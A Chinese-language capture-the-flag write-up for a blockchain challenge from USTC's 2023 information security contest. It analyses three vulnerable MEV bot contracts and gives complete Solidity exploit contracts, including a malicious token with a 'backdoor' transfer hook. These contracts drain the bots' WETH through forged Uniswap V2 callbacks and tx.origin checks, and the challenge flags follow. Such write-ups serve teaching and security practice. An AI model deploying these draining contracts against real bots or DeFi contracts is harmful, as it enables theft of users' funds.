---
title: Blockchain - 链上猎手
description: 2023 | 中国科学技术大学第十届信息安全大赛 | general
tags:
    - mev
    - uniswap v2
---

## 题目

你最近研究了一下如何在区块链上开发一个 MEV Bot，而小 Z 跟你说：「区块链就像是一个黑暗森林，到处都是带枪的猎人。」

[:material-download: `chain_hunter.zip`](static/chain_hunter.zip)

注：题目环境未启用 EVM 的 Shanghai 升级，不支持 PUSH0 指令，与 Solidity 0.8.20 及以上版本的默认编译选项不兼容，请注意选择正确的 EVM 版本。

### The Maximal Extractable Value

「我新写的 MEV Bot，是不是很安全？」

### The Dark Forest

「Gas fee 好贵！听别人说节约 gas 的一个好方法就是把能在链下检查的逻辑都从智能合约挪到链下去检查。」

### Death's End

「每次更新代码都重新部署智能合约也太贵了，我这次一定要写一个通用的 MEV Bot 合约！」

## 解题思路

- 初始共有两个 `UniswapV2Pair`，`WETH` 和 `Token` 的比例分别为 1:1 和 1:2
- 每小题对应不同的 MEV bot，将在每个区块采用不同的方式在两个 pair 间按照特定路径套利

    ```py
    for token, pairs in token_to_pairs.items():
        if len(pairs) == 2:
            logging.info(f'Processing WETH -> {token} -> WETH, pairs={pairs}')
            try:
                process_pairs(token, *pairs)
    ```

- MEV bot 初始持有 1 WETH，目标是使其余额为 0

### The Maximal Extractable Value

由于只检查了 `IUniswapV2Pair(msg.sender).factory()` 的返回值是否为 `FACTORY1` 或 `FACTORY2`，因此可以创建一个假 pair 来转出 MEV bot 中的 WETH。

```js
function uniswapV2Call(address sender, uint, uint, bytes calldata data) external {
    require(IUniswapV2Pair(msg.sender).factory() == FACTORY1 || IUniswapV2Pair(msg.sender).factory() == FACTORY2);
    require(sender == address(this));
    (IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, bool dir) = abi.decode(data, (IUniswapV2Pair, IUniswapV2Pair, uint, uint, bool));
    require(WETH.transfer(address(pair1), amount1));
    pair1.swap(dir ? amount2 : 0, dir ? 0 : amount2, address(pair2), '');
}
```

#### Exploitation

```js
contract FakePair {
    address public factory;

    function exploit(IUniswapV2Callee _bot, address _factory, IWETH weth) external {
        factory = _factory;
        address bot = address(_bot);
        bytes memory data = abi.encode(address(this), address(this), weth.balanceOf(bot), 0, true);
        _bot.uniswapV2Call(bot, 0, 0, data);
    }

    // let `pair1.swap()` call not revert
    function swap(uint, uint, address, bytes calldata) external {}
}
```

#### Flag

> flag{ch3ck_Y0ur_c4llb4ck!!8e0af8a0d1}

### The Dark Forest

- MEV bot 在模拟执行成功后才会发起链上套利交易

    ```py
    bot.functions.simulate(pair1_address, pair2_address, amount1, amount2, amount3, direction).call(
        {'nonce': nonce, 'from': acct.address, 'gas': 10 ** 6, 'gasPrice': 10 ** 11}
    )
    tx = bot.functions.arbitrage(pair1_address, pair2_address, amount1, amount2, amount3, direction).build_transaction(
        {'nonce': nonce, 'from': acct.address, 'gas': 10 ** 6, 'gasPrice': 10 ** 11}
    )
    ```

- `arbitrage()` 和 `simulate()` 所执行的操作完全一致，即先从 `pair2` 中换出 `WETH`，再在回调中使用一部分 `WETH` 换取中间代币以完成 `pair2.swap()`。但 `arbitrage()` 缺少保证交易获利的 `require` 语句

    ```js
    function arbitrage(IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, uint amount3, bool dir) external {
        require(msg.sender == owner, "sender");
        pair2.swap(dir ? 0 : amount3, dir ? amount3 : 0, address(this), abi.encode(pair1, pair2, amount1, amount2, dir));
    }

    function simulate(IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, uint amount3, bool dir) external {
        require(msg.sender == owner, "sender");
        uint balanceBefore = WETH.balanceOf(address(this));
        pair2.swap(dir ? 0 : amount3, dir ? amount3 : 0, address(this), abi.encode(pair1, pair2, amount1, amount2, dir));
        require(WETH.balanceOf(address(this)) > balanceBefore, "balance");
    }
    ```

- `uniswapV2Call()` 虽然增加了访问控制，但验证的是 `tx.origin`

    ```js
    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        require(tx.origin == owner, "origin");
    ```

- 由于题目环境相对固定，可以简单地通过区块号来区分模拟交易和实际套利交易。创建由受控代币和 `WETH` 组成的交易对，诱使 MEV bot 调用 `arbitrage()`，并在实际套利交易中调用 `uniswapV2Call()` 来转出资金

#### Exploitation

```js
contract HackToken {
    string public constant name     = "Hack Token";
    string public constant symbol   = "HT";
    uint8  public constant decimals = 18;
    uint public totalSupply = 1 ether;

    IUniswapV2Callee bot;
    address weth;
    bool hacked;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    constructor(IUniswapV2Callee _bot, address _weth) {
        balanceOf[msg.sender] = totalSupply;
        weth = _weth;
        bot = _bot;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    // transfer() 将在 pair1.swap() 中被调用，即 MEV bot 发送 WETH 之后
    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        backdoor();
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);
        return true;
    }

    function backdoor() internal {
        // 区分模拟交易和实际套利交易
        if (!hacked && block.number % 2 != 0) {
            bytes memory data = abi.encode(
                address(this),
                address(this),
                IWETH(weth).balanceOf(address(bot)),
                0,
                true
            );
            bot.uniswapV2Call(address(0), 0, 0, data);
            hacked = true;
        }
    }

    function swap(uint, uint, address, bytes calldata) external {}
}

contract Hack {
    // This will cost a lot of gas uwu
    function exploit(
        IUniswapV2Factory factory1,
        IUniswapV2Factory factory2,
        IWETH weth,
        IUniswapV2Callee bot
    ) external payable {
        HackToken token = new HackToken(bot, address(weth));
        address pair1 = factory1.createPair(address(weth), address(token));
        address pair2 = factory2.createPair(address(weth), address(token));

        weth.deposit{value: msg.value}();

        require(weth.transfer(pair1, 0.1 ether));
        require(token.transfer(pair1, 0.1 ether));
        IUniswapV2Pair(pair1).mint(address(this));

        require(weth.transfer(pair2, 0.1 ether));
        require(token.transfer(pair2, 0.2 ether));
        IUniswapV2Pair(pair2).mint(address(this));
    }
}
```

#### Flag

> flag{S1MUl4t1oN_d0esnt_Gu4r4ntee_EXEcution_c0rr3ctne5555f5b9c201}

### Death's End

- 本小题的 `arbitrage()` 能够保证套利结束后合约持有 `WETH` 增加，其函数功能相当于 `multicall()`

    ```js
    function arbitrage(address[] calldata addressList, bytes[] calldata calldataList) external {
        require(msg.sender == owner, "sender");
        uint balanceBefore = WETH.balanceOf(address(this));
        require(addressList.length == calldataList.length);
        for (uint i = 0; i < addressList.length; i++) {
            (bool success, ) = addressList[i].call(calldataList[i]);
            require(success);
        }
        require(WETH.balanceOf(address(this)) > balanceBefore, "balance");
    }
    ```

- `uniswapV2Call()` 同样修改为了 `multicall()` 的形式，但仍然是对 `tx.origin` 进行验证

    ```js
    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        require(tx.origin == owner, "origin");
        (address[] memory addressList, bytes[] memory calldataList) = abi.decode(data, (address[], bytes[]));
        require(addressList.length == calldataList.length);
        for (uint i = 0; i < addressList.length; i++) {
            (bool success, ) = addressList[i].call(calldataList[i]);
            require(success);
        }
    }
    ```

- 与 [The Dark Forest](#the-dark-forest-1) 的思路类似，可以在套利交易中调用 `uniswapV2Call()` 来授予其它账户 `WETH` 的使用权，再在套利结束后取出 MEV bot 中的资金

#### Exploitation

```js
contract HackToken {
    string public constant name     = "Hack Token";
    string public constant symbol   = "HT";
    uint8  public constant decimals = 18;
    uint public totalSupply = 1 ether;

    IUniswapV2Callee bot;
    address weth;
    address owner;
    bool hacked;

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);

    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    constructor(IUniswapV2Callee _bot, address _weth) {
        balanceOf[msg.sender] = totalSupply;
        weth = _weth;
        bot = _bot;
        owner = tx.origin;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        backdoor();
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);
        return true;
    }

    function backdoor() internal {
        if (!hacked && tx.origin != owner) {
            address[] memory addressList = new address[](1);
            bytes[] memory calldataList = new bytes[](1);
            addressList[0] = weth;
            calldataList[0] = abi.encodeWithSignature(
                "approve(address,uint256)",
                owner,
                type(uint).max
            );
            bytes memory data = abi.encode(
                addressList,
                calldataList
            );
            bot.uniswapV2Call(address(0), 0, 0, data);
            hacked = true;
        }
    }

    function swap(uint, uint, address, bytes calldata) external {}
}

contract Hack {
    function exploit(
        IUniswapV2Factory factory1,
        IUniswapV2Factory factory2,
        IWETH weth,
        IUniswapV2Callee bot
    ) external payable {
        HackToken token = new HackToken(bot, address(weth));
        address pair1 = factory1.createPair(address(weth), address(token));
        address pair2 = factory2.createPair(address(weth), address(token));

        weth.deposit{value: msg.value}();

        require(weth.transfer(pair1, 0.1 ether));
        require(token.transfer(pair1, 0.1 ether));
        IUniswapV2Pair(pair1).mint(address(this));

        require(weth.transfer(pair2, 0.1 ether));
        require(token.transfer(pair2, 0.2 ether));
        IUniswapV2Pair(pair2).mint(address(this));
    }
}
```

#### Flag

> flag{RuN_Ur_0wn_B0T_4_FuN_&_Pr0f1t:)b7e0a89554}
